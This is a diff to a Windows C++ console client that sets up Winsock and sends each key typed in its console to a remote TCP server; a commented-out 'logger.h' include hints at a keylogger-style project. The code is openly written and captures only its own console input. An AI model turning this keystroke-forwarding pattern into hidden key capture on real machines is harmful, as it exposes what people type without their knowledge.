@@ -1,13 +1,18 @@
 //#define DLL_EXPORT
-#include "logger.h"
-#include <Windows.h>
-#include <iostream>
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#pragma once
+#pragma comment (lib, "ws2_32.lib")
+//#include "logger.h"
 #include <WinSock2.h>
+#include <Windows.h>
+#include "WSAInitializer.h"
+#include <iostream>
 #include <string>
 #include <conio.h>
 
 int main()
 {
+	WSAInitializer wsaInit;
 	// we connect to server that uses TCP. thats why SOCK_STREAM & IPPROTO_TCP
 	SOCKET _clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
 
@@ -29,12 +34,12 @@ int main()
 	char c = '\0';
 
 	while (1) {
-		if (kbhit()) {
-			c = getch();
+		if (_kbhit()) {
+			c = _getch();
 		}
 		/* If a key has been pressed */
 		if (c != '\0') {
-
+			send(_clientSocket, std::to_string(c).c_str(), std::to_string(c).size() , 0);  // last parameter: flag. for us will be 0.
 			c = '\0'; // and put it back to \0
 		}
 
